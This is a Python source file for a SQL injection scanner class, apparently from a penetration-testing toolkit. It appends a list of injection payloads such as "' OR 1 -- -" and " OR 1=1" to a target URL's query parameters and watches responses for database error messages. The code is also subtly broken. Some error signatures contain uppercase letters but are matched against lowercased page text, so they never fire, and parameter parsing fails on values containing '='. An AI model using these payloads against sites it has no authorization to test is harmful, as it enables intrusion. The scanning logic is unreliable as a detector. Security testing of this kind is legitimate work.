import requests
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
from core.colors import log_info, log_success, log_warning, log_danger

class SQLiScanner:
    def __init__(self, target):
        self.target = target
        self.payloads = [
            "'", "''", "`", "``", ",", '"', '""', "/", "//", "\\\\", ";", "' or \"", "-- or #",
            "' OR '1", "' OR 1 -- -", '" OR "" = "', '" OR 1 = 1 -- -', "' OR '' = '",
            "'='", "'LIKE'", "'=0--+", " OR 1=1"
        ]
        self.errors = [
            "you have an error in your sql syntax;",
            "warning: mysql",
            "unclosed quotation mark after the character string",
            "quoted string not properly terminated",
            "pg_query() [:",
            "sqlite3.OperationalError:",
            "Microsoft Access Driver"
        ]

    def scan_url(self):
        log_info(f"Scanning URL parameters for SQLi on {self.target}...")
        parsed = urlparse(self.target)
        if not parsed.query:
            log_warning("No URL parameters found to test for SQLi.")
            return False

        base_url = self.target.split("?")[0]
        params = dict(x.split('=') for x in parsed.query.split('&'))
        
        for payload in self.payloads:
            for param in params.keys():
                test_params = params.copy()
                test_params[param] = test_params[param] + payload
                try:
                    response = requests.get(base_url, params=test_params, timeout=5)
                    for error in self.errors:
                        if error in response.text.lower():
                            log_success(f"[VULNERABLE] SQLi detected in parameter '{param}' with payload: {payload}")
                            return True
                except Exception:
                    pass
        log_info("No SQLi vulnerabilities detected in URL.")
        return False

    def run(self):
        return self.scan_url()
